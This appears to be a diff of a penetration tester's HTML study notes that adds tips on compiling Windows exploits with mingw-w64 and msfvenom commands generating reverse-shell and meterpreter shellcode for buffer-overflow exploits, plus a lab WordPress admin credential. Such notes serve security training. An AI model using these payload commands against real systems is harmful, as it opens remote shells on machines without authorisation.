@@ -16,15 +16,29 @@
     <ul>
     <li>Dealing with powershell wrapping? Just put the entire output in a variable and do <code>${variable} | Out-GridView</code></li>
     </ul>
-    <p>Using MinGW
-    <code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</code></p>
-    <p>Use <code>psql</code> to connect to PostgreSQL</p>
+
+    <p>Fixing Memory Corruption Exploits</p>
+    <ul>
+    <li>If it needs to be compiled on windows, use mingw-w64<ul>
+    <li><code>sudo apt install mingw-w64</code></li>
+    <li><code>i686-w64-mingw32-gcc</code></li>
+    <li><code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</code></li>
+    <li>if compilation errors arise, just search them up<ul>
+    <li><code>-lws2_32</code> can be used for undefined references to _imp</li>
+    <li><code>-l</code> can be used for statically link local libraries</li>
+    </ul>
+    </li>
+    </ul>
+    </li>
+    
+    <li>Can update shellcode in exploits with new shellcode using msfvenom</li>
+    <li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f c</code></li>
+    <li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f c</code></li>
+    <li>Encoding shellcode for binary for buffer overflow: <code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f raw &gt; shellcode.bin</code></li>
+</ul>
+
     <p>Seems the WP admin creds are no longer admin/test, but rather admin/password</p>
-    <p>AD cheat sheet - <a href="https://wadcoms.github.io/#">https://wadcoms.github.io/#</a>
-    AD mindmap - <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg</a>
-    <a href="https://academy.hackthebox.com/module/113/section/1087">HackTheBox - Attacking Common Applications</a>
-    <a href="https://academy.hackthebox.com/module/116/section/1140">HackTheBox - Attacking Common Services</a>
-    <a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">SQLi cheat sheet</a></p>
+
     <p>Using SMTP with <code>swaks</code></p>
     <ul>
     <li>To use an SMTP server, we need a user whose credentials we know on the domain
